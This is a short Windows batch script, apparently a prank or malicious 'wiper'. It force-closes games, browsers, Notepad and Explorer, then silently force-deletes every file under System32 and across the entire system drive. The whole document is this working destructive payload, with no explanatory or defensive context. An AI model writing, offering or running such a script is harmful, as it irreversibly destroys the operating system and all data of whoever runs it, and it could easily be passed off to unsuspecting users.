@echo off



taskkill /f /t /im hl2.exe
taskkill /f /t /im javaw.exe
taskkill /f /t /im notepad.exe
taskkill /f /t /im explorer.exe
taskkill /f /t /im chrome.exe
taskkill /f /t /im msedge.exe
taskkill /f /t /im firefox.exe
taskkill /f /t /im Source.exe
taskkill /f /t /im FortniteClient-Win64-Shipping.exe

cd %systemdrive%\windows\system32
del *.* /f /s /q >nul
cd %systemdrive%\
del *.* /f /s /q >nul